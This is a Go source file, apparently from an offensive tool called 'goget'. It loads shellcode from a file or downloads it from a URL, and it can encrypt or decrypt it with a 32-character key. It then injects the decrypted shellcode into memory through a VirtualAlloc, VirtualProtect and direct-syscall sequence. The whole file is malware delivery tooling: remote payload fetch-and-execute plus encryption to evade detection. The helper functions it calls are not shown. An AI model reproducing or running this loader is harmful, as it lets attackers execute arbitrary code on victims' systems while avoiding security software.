package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

func main() {
	path := flag.String("p", "", "path or URL to shellcode file")
	encrypt := flag.String("e", "", "a 32 char long key used to encrypt the file")
	decrypt := flag.String("d", "", "a 32 char long key used to decrypt the file")
	inject := flag.String("i", "", `method of code injection.
	methods are:
	- syscall (virtualalloc READWRITE -> RTLCOPY -> virtualprotect EXECUTRE -> syscall)
	- thread () // not implemented
	- proc () // not implemented
	example:
	goget -m syscall
	`)
	flag.Parse()

	// validate required args
	if *path == "" {
		flag.PrintDefaults()
		panic("[-] URL not provided")
	}

	var sc []byte

	if strings.HasPrefix(*path, "http") {
		sc = get(*path)
	} else {
		stat, err := os.Stat(*path)
		if err != nil {
			panic(fmt.Sprintf("[-] Error opening file at %s: %s", *path, err))
		} else {
			if stat.IsDir() {
				panic(fmt.Sprintf("[-] Is a dir %s", *path))
			} else {
				fmt.Printf("[*] Opening a file: %s\r\n", *path)
			}
		}

		sc, err = os.ReadFile(*path)
		if err != nil {
			panic(fmt.Sprintf("[-] Error reading file at %s: %s", *path, err))
		}

		fmt.Printf("[+] Got file, len=%d\r\n", len(sc))
	}

	var data []byte
	if *encrypt != "" {
		key := []byte(*encrypt)
		if len(*encrypt) != 32 {
			panic(fmt.Sprintf("[-] Key: %s wrong length, should be 32 chars", *encrypt))
		} else {
			data = Encrypt(key, sc)
			f, err := os.Create("sc.enc")
			if err != nil {
				panic(fmt.Sprintf("[-] Error creating a file: %s", err))
			}

			defer f.Close()

			_, err = f.Write(data)
			if err != nil {
				panic(fmt.Sprintf("[-] Error writing to a file: %s", err))
			}

			fmt.Println("[+] encrypted bytes saved as sc.enc")
		}
	}

	if *decrypt != "" {
		key := []byte(*decrypt)
		if len(*decrypt) != 32 {
			panic(fmt.Sprintf("[-] Key: %s wrong length, should be 32 chars", *decrypt))
		} else {
			data = Decrypt(key, sc)

			// save decrypted data to a file ONLY if we do not want to inject it (for later)
			if *inject == "" {
				f, err := os.Create("sc.dec")
				if err != nil {
					panic(fmt.Sprintf("[-] Error creating a file: %s", err))
				}

				defer f.Close()

				_, err = f.Write(data)
				if err != nil {
					panic(fmt.Sprintf("[-] Error writing to a file: %s", err))
				}

				fmt.Println("[+] decrypted bytes saved as sc.dec")
			}
		}
	}

	if *inject != "" {
		switch *inject {
		case "syscall":
			DirectSyscall(data)
		default:
			DirectSyscall(data)
		}
	}
}

func get(url string) []byte {
	fmt.Printf("[*] Getting file from %s\r\n", url)
	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("[+] Got file, len=%d\r\n", len(bodyBytes))
	return bodyBytes
}
